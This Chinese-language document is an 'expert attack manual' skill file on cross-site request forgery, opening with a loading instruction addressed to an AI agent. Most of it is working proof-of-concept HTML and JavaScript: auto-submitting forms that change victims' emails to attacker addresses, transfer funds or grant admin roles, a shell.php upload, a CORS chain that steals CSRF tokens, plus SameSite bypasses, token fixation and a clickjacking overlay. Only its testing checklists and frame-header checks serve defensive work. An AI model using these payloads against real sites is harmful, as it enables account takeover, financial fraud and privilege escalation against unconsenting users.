# 技能：CSRF — 跨站请求伪造 — 专家攻击手册

> **AI 加载指令**：专家 CSRF 技术。涵盖现代绕过向量（SameSite 间隙、自定义头缺陷、无令牌绕过模式）、JSON CSRF、多部分 CSRF、与 XSS 链接。基础模型通常仅提供基本的 CSRF，而不会涵盖 SameSite 边缘情况和常见的令牌实现错误。

## 0. 相关路由

同时加载：

- 当 JSON 端点变为跨域可读时，加载 `[cors 跨域配置错误](../cors-cross-origin-misconfiguration/SKILL.md)`
- 当登录、账户链接或回调绑定依赖于 OAuth 状态时，加载 `[oauth oidc 配置错误](../oauth-oidc-misconfiguration/SKILL.md)`

---

## 1. 核心概念

CSRF 利用受害者的活动会话来执行状态变更请求，这些请求**来自攻击者的源**。

**必要条件**：
1. 受害者已通过身份验证（活动会话 Cookie）
2. 服务器仅通过 Cookie 标识会话（无二次验证）
3. 攻击者可以预测/构造有效请求
4. Cookie 跨域发送（SameSite=None 或旧行为）

---

## 2. 查找 CSRF 目标

**高价值状态变更端点**：
```
- 修改密码         ← 账户接管
- 修改邮箱            ← 账户接管
- 添加管理员 / 修改角色 ← 权限提升
- 银行/支付转账       ← 财务影响
- OAuth 应用授权 ← 控制OAuth流程
- 账户删除
- 禁用双因素认证  
- SSH 密钥 / API 密钥添加
- Webhook 配置
- 个人资料/联系信息更新
```

---

## 3. 令牌绕过技术

### 无令牌存在
最简单的情况 — 表单中缺少 CSRF 令牌。检查 POST /change-email 是否有任何令牌。如果没有 →  trivially 可利用。

### 令牌未验证（最常见发现！）
令牌存在于请求中但服务器端从未验证：
```
完全移除 _csrf_token 参数 → 请求是否仍然成功？
→ 是 → trivial 绕过
```

### 令牌与会话关联但与用户无关
```
步骤 1：以 UserA 身份登录 → 获取有效 CSRF 令牌
步骤 2：在其他浏览器中以 UserB 身份登录 → 获取 UserB CSRF 令牌  
步骤 3：在 UserA 的会话中使用 UserB 的 CSRF 令牌（攻击者控制 UserB）
→ 如果服务器验证令牌存在但检查令牌是否属于会话 → 绕过
```

### 仅在 Cookie 中存在令牌
当服务器将 CSRF 令牌设置为 Cookie 并期望其在请求头/表单中返回：
```
Set-Cookie: csrf=ATTACKER_CONTROLLED
→ 如果 Cookie 可以由子域名设置（Cookie 抛掷）：将 Cookie 设置为已知值
→ 提交带有已知令牌的表单 + 已知令牌在 Cookie 中 = 绕过
```

### 静态或可预测的令牌
```
→ 所有用户/会话使用相同令牌
→ 令牌 = base64(username) 或 md5(session_id) → 可逆
→ 令牌 = 时间戳 → 可预测
```

### 双提交 Cookie 模式（如果子域名受信任则失效）
```
如果攻击者可以从子域名 XSS 或 Cookie 抛掷中写入 .target.com 的 Cookie：
→ 在 .target.com 上设置 csrf_cookie=CONTROLLED
→ 提交带有 X-CSRF-Token: CONTROLLED 的请求
→ 服务器检查 header == cookie → 匹配 → 绕过
```

---

## 4. SameSite 绕过场景

**SameSite=Lax**（现代浏览器默认）：Cookie 仅在顶级 GET 导航中发送，**不**在跨站 iframe/表单 POST 中发送。

**通过 GET 方法绕过 SameSite=Lax**：
```html
<!-- 如果服务器接受状态变更端点的 GET 请求： -->
<img src="https://target.com/account/delete?confirm=yes">
<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>
```

**通过子域名 XSS（SameSite Lax/Strict）绕过**：
```javascript
// sub.target.com 上的 XSS → 同站源 → SameSite Cookie 发送！
// 使用 XSS 作为 CSRF 的中转站
window.location = 'https://target.com/account/modify?evil=true';
```

**SameSite=None**（旧版或显式设置）：Cookie 每处发送 → 经典 CSRF 适用。

**最近发布的 Cookie？Lax 免责**：
Chrome 有一个 2 分钟的例外，其中 Lax Cookie 会发送在跨站 POST 上，如果 Cookie 刚刚设置（用于 OAuth 流程）。竞争窗口：设置 Cookie，立即触发 CSRF 在 2 分钟内。

---

## 5. CSRF 概念验证模板

### 简单表单 POST
```html
<html>
<body>
<form id="csrf" action="https://target.com/account/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### 自动点击提交
```html
<body onload="document.forms[0].submit()">
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
</body>
```

### 通过 GET 的 CSRF（带有 img 标签）
```html
<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">
```

### 带有自定义头的 CSRF（XMLHttpRequest — 仅同源，击败简单防御）
如果 API 要求自定义头如 `X-CSRF-Token` 但也接受带通配符 CORS 的 JSON — 如果 CORS 配置错误，自定义头不会保护：
```javascript
// 如果 Access-Control-Allow-Origin: * with credentials → 破坏
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;  // 仍然需要发送 Cookie
xhr.send('{"to":"attacker","amount":1000}');
```

---

## 6. JSON CSRF

当端点接受 `Content-Type: application/json` — fetch() 带有 CORS 凭据：

```javascript
// 如果 CORS 允许凭据 + 端点：
fetch('https://target.com/api/v1/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```
**要求**：`Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true`

**如果服务器仅接受 `application/json` 但没有 fetch CORS**：
无法从 HTML 表单进行正确的 JSON CSRF（表单只能发送 `application/x-www-form-urlencoded`，`multipart/form-data`，`text/plain`）。

**技巧 — 内容类型降级**：如果服务器将 `text/plain` 身体处理为 JSON：
```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
结果身体：`{"email":"attacker@evil.com","ignore":"="}`

---

## 7. 多部分 CSRF

当将 `Content-Type` 从 `application/json` 更改为 `multipart/form-data` 且请求仍然工作：
```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```

---

## 8. CSRF + XSS 组合（CSRF 令牌绕过）

当 CSRF 保护其他方面非常牢固时，XSS 启用 CSRF 绕过：
```javascript
// 步骤 1：XSS 从 DOM 读取 CSRF 令牌
var token = document.querySelector('input[name="csrf_token"]').value;
// 步骤 2：提交带有真实令牌的 CSRF 请求
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/delete', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes&csrf_token=' + token);
```

---

## 9. OAuth CSRF（缺少 STATE 参数）

没有 `state` 参数的 OAuth 流程 → OAuth 授权上的 CSRF：

**攻击**：
1. 攻击者启动 OAuth 流程，获得授权码
2. 在交换代码之前，停止流程（捕获带有代码的重定向 URL）
3. 向受害者发送定制的 URL：`https://target.com/oauth/callback?code=ATTACKER_CODE`
4. 受害者浏览器交换攻击者的代码 → 受害者账户链接到攻击者的 OAuth 提供商

**影响**：攻击者可以冒充受害者登录。

---

## 10. CSRF 测试清单

```
□ 完全移除 CSRF 令牌 → 请求是否成功？
□ 将 CSRF 令牌更改为随机值 → 请求是否成功？
□ 使用另一个用户会话中的 CSRF 令牌 → 请求是否成功？
□ 检查 POST 端点的 GET 版本是否存在
□ 检查会话 Cookie 的 SameSite 属性
□ 测试内容类型更改（json → form → text/plain）是否仍然处理
□ 检查 CORS 策略：`Access-Control-Allow-Credentials: true` 是否出现？
   带有通配符或攻击者源？→ 可利用的 JSON CSRF
□ 检查 OAuth 流程是否存在缺少 state 参数
□ 测试基于 Referer 的保护：发送没有 Referer 头的请求
□ 测试基于 Referer 的保护：在 Referer 中伪造子域名
```

---

## 11. JSON CSRF 技术

### 方法 1：text/plain 伪装

```html
<!-- 浏览器发送 Content-Type: text/plain 与 JSON-like 身体 -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
  <input type="submit" value="Click me">
</form>
<!-- 结果身体：{"role":"admin","ignore":"="} -->
<!-- 如果服务器不严格检查 Content-Type，可能会解析为 JSON -->
```

### 方法 2：带有凭据的 XHR

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/role", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"role":"admin"}');
</script>
<!-- 仅当 CORS 允许源时才有效（misconfigured CORS + CSRF 组合） -->
```

### 方法 3：fetch() API

```html
<script>
fetch("https://target.com/api/role", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"role":"admin"}'
});
</script>
```

---

## 12. 多部分 CSRF & 客户端路径遍历

### 多部分文件上传 CSRF

```html
<script>
var formData = new FormData();
formData.append("file", new Blob(["malicious content"], {type: "text/plain"}), "shell.php");
formData.append("action", "upload");

fetch("https://target.com/upload", {
  method: "POST",
  credentials: "include",
  body: formData
});
</script>
```

### 客户端路径遍历到 CSRF（CSPT2CSRF）

```
正常流程：前端获取 /api/user/PROFILE_ID/settings
攻击：将 PROFILE_ID 设置为 ../../admin/dangerous-action

结果：前端 fetch() 载入 /api/admin/dangerous-action 并带有受害者的 Cookie
这将路径遍历转换为 CSRF 类似的攻击，而无需 CSRF 令牌
```

| 方面 | 传统 CSRF | CSPT2CSRF |
|---|---|---|
| 源 | 攻击者站点 | 同源 JavaScript |
| 令牌绕过 | 需要令牌伪造 | 无需令牌（同源） |
| SameSite | 被 SameSite=Strict 阻止 | 绕过 SameSite（同站！） |
| 检测 | 标准 CSRF 检查 | 需要路径段输入验证 |

---

## 13. SameSite=Lax 高级绕过技术

### 13.1 通过 `window.open()` 的顶级导航（2 分钟窗口）

Chrome 的 Lax+POST 例外：`SameSite=Lax` Cookie 如果在最后 2 分钟内设置（存在于 OAuth 流程中），会发送在跨站 POST 请求上。

```javascript
// 攻击页面：触发登录以设置新鲜 Cookie，然后立即 CSRF
// 步骤 1：强制受害者访问 target（设置新鲜会话 Cookie）
window.open('https://target.com/login');
// 步骤 2：在 2 分钟内，POST 到状态变更端点
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/account/change-email';
    form.innerHTML = '<input name="email" value="attacker@evil.com">';
    document.body.appendChild(form);
    form.submit();
}, 5000);
```

### 13.2 从攻击者站点发起的 302 重定向链

Lax Cookie 在顶级 GET 导航中发送。重定向链将 GET 转换为动作：

```text
1. 攻击页面 → 302 重定向到 https://target.com/transfer?to=attacker&amount=1000
2. 浏览器跟随重定向作为顶级导航 → Lax Cookie 发送
3. 如果目标接受 GET 用于状态变更操作 → CSRF 成功
```

### 13.3 方法覆盖：POST 伪装为 GET

许多框架支持通过 `_method` 参数的方法覆盖：

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

触发方法覆盖的头部：
```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT (Rails, Laravel, Symfony)
```

SameSite=Lax 允许 GET → 框架通过覆盖处理它作为 POST/DELETE → “POST 仅”端点的 CSRF。

---

## 14. 高级 JSON CSRF 技术

### 14.1 基于 Flash 的内容类型操作（旧版）

Flash（2021 年前）可以跨域发送任意 `Content-Type` 头部，无需预检：

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

旧版但仍然适用于较旧的内部应用程序。

### 14.2 fetch() no-cors 模式限制和解决方案

`fetch()` 在 `no-cors` 模式下可以发送简单请求，但不能设置 `Content-Type: application/json`（触发预检）或读取响应。

解决方案 — 如果服务器接受 `text/plain` 身体并解析为 JSON：

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 将 JSON 编码为 form-urlencoded

一些后端接受两种内容类型：

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

如果服务器将 `role=admin&user_id=123` 与 `{"role":"admin","user_id":123}` 处理相同 → 通过 HTML 表单 CSRF 而无需 CORS 预检。

---

## 15. CSRF + CORS 配置错误链

### 反射源 + 凭据

```text
1. 目标 API 在 Access-Control-Allow-Origin 中反射 Origin
2. Access-Control-Allow-Credentials: true
3. 攻击者页面发送带有凭据的 fetch() 从 https://evil.com
4. 响应可读 → 提取 CSRF 令牌
5. 第二个请求带有有效 CSRF 令牌 → 绕过所有 CSRF 防御
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
      });
  });
```

### 子域名 XSS → CORS → CSRF

如果 `*.target.com` 在 CORS 允许列表中且任何子域名存在 XSS：
1. 在 `blog.target.com` 上利用 XSS
2. 从 XSS 上下文中，fetch API at `api.target.com`（CORS 允许子域名）
3. 从响应中读取 CSRF 令牌
4. 提交带有有效令牌的状态变更请求

---

## 16. CSRF 令牌固定（预会话令牌）

如果 CSRF 令牌在身份验证之前发出且在登录后仍然有效：

```text
1. 攻击者访问 target.com → 接收 CSRF 令牌 T1
2. 攻击者强制受害者浏览器使用 T1:
   a. 从子域名进行 Cookie 抛掷
   b. CRLF 注入以设置 csrf_cookie
3. 受害者登录 — CSRF 令牌未更改
4. 攻击者使用已知 T1 提交 CSRF 请求 → 成功
```

### 测试步骤

```text
□ 以未身份验证用户身份获取 CSRF 令牌
□ 登录 — CSRF 令牌是否更改？
□ 如果未更改 → 令牌固定：预认证令牌在认证后有效
□ 在对认证端点的 CSRF PoC 中使用预认证令牌
```

---

## 17. 点击劫持作为 CSRF 绕过

当 CSRF 防护非常牢固但缺少 `X-Frame-Options` / `frame-ancestors` 时：

### 攻击流程

```text
1. 目标页面可被框架化（无 X-Frame-Options / CSP frame-ancestors）
2. 攻击者创建透明 iframe 覆盖层
3. 受害者看到攻击者内容，点击落在隐藏 iframe 中的目标操作按钮
4. 点击来自相同源（iframe 内） — 绕过 CSRF 令牌
```

### PoC 模板

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### 防御检查

```text
□ X-Frame-Options: DENY 或 SAMEORIGIN 头部存在？
□ CSP: frame-ancestors 'self' 或 frame-ancestors 'none'？
□ 如果都不是 → 点击劫持可能 → 通过 iframe 的 CSRF 绕过
```
